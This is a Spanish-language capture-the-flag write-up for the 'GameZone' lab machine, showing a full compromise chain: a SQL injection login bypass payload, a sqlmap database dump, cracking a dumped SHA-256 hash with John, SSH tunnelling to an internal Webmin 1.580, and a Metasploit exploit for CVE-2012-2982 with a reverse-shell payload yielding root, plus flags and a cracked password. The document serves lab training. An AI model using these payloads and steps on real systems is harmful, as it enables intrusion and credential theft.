# GameZone - rmartinez 18/01/2022

IP: 10.10.221.1

## 1. Deploy the vulnerable machine

- What is the name of the large cartoon avatar holding a sniper on the forum?

```
Buscamos en google por imagen y vemos que es el prota de Hitman: Sniper ->

Agent 47
```

## 2. Access with SQL injection

En el home de la página vemos un formulario de login que al parecer es vulnerable
a SQLi. Se nos instruye de usar como usuario 

```
' or 1=1 -- -
```

para pasar la validación de la query y pasar a la siguiente página
```
portal.php
```
En esta página tenemos un buscador que al poner una comilla vemos que es claramente vulnerable a SQL injection:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```
Abrimos la página con Burp y nos guardamos la request con Burp para pasársela a sqlmap:
```
sqlmap -r portal_req.txt -dbms=mysql --dump
```
Vemos que esto nos genera dos tablas, users y post. Nos traemos los .csv que ha generado y respondemos el resto de preguntas.

# 3. Cracking passwords with John

Vamos a crackear la password del usuario agent47 usando John. Para ello nos llevamos el hash que hemos dumpeado e identificamos de que tipo es (https://tunnelsup.com/hash-analyzer/). Vemos que es un SHA-256 por lo que usaremos John con la lista rockyou.txt:
```
touch hash.txt
echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt
/opt/john/john hash.txt --wordlist=/opt/wordlists/rockyou.txt --format=raw-sha256
```
Nos saca la contraseña:
```
videogamer124
```
Nos conectamos por SSH a la máquina y sacamos la flag del user:
```
agent47@gamezone:~$ cat user.txt 
649ac17b1480ac13ef1e4fa579dac95c
```

## 4. Exposing services with reverse SSH tunnels

Se nos pide que exposeemos un puerto 10000 que está bloqueado por una regla de iptables, para ello haremos un:

```
ss -tulpn
```
y vemos que está exposeado pero no tenemos acceso, pero si hacemos un curl desde dentro sí tenemos acceso, por lo que exposearemos mediante un tunel ssh el servicio:

```
ssh -L 10000:localhost:10000 agent47@10.10.221.1
```
y ya tenemos acceso, vemos que es un Webmin 1.580

## 5. Privilege escalation with Metasploit

Buscamos en exploit-db un exploit para Webmin 1.580 y vemos que es vulnerable a la CVE-2012-2982. Vamos a metasploit y buscamos un exploit para dicha CVE, usaremos
```
unix/webapp/webmin_show_cgi_exec
```
Usaremos como payload cmd/unix/reverse. Rellenamos parámetros, runeamos y gg pwned.

```
whoami
root
cd /root
ls
root.txt
cat root.txt
a4b945830144bdd71908d12d902adeee
```